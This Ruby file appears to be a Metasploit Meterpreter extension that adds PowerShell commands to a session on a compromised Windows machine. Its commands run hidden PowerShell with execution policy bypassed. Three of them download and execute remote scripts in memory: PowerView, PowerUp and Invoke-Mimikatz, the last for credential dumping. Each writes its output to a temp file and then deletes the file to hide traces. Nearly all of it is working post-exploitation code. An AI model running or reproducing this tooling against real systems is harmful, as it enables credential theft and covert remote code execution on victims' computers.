# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The password database portion of the privilege escalation extension.
#
###
class Console::CommandDispatcher::Priv::PowerShell

  Klass = Console::CommandDispatcher::Priv::PowerShell

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    {
      "power_shell" => "Execute a powershell command.",
      "power_view"  => "Download and execute Veil's PowerView Framework",
      "power_up"    => "Download and execute the PowerUp Framework",
      "power_katz"  => "Invoke-Mimikatz into memory using PowerShell"
    }
  end

  POWER_VIEW_USAGE = %q{

Command => Explaination
=======================

Get-HostIP => It retrieves the local IP of the target.

}

  @@command_opts = Rex::Parser::Arguments.new(
    "-o" => [false, "Select a location to send command output to."],
    "-t" => [false, "The arguments to pass to the command."],
    "-h" => [false, "Help menu."]
  )

  #
  # Name for this dispatcher.
  #
  def name
    "Interactive Powershell"
  end

  #
  # Displays the contents of the SAM database
  #
  def cmd_power_shell(*args)    
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c #{ps_cmd} >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client...")
    sleep(10)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

  def cmd_power_view(*args)
    output_file = nil
    c_time      = 10
    @@command_opts.parse(args) do |opt, idx, val|
      case opt
      when '-o'
        output_file = val
      when '-t'
        begin
          c_time = Integer(val)
        rescue
          print_error "#{val} is not a valid Integer."
        end
      when '-h'
        print_line(POWER_VIEW_USAGE)
        print_line("-" * 60)
        print("Usage: power_view [-t TIME] [-o FILE] COMMAND\n" +
              "Runs the Veil PowerView framework on the remote host.\n" +
              @@command_opts.usage)
        return true
      end
    end
    link = 'https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1'
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client...")
    sleep(10)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

  def cmd_power_up(*args)
    link = 'https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1'    
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client...")
    sleep(10)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

  def cmd_power_katz(*args)
    link = 'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'    
    output  = "#{rand(100000)}"
    ps_cmd  = args.join(" ")
    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    print_status("Sending command to client...")
    print_warning("This could take a bit...")
    sleep(11)
    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
    begin
      while ((data = log_file.read) != nil)
        data.strip!
        print_line(data)
      end
    rescue EOFError
    ensure
      log_file.close
    end

    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
    return true
  end

end

end
end
end
end

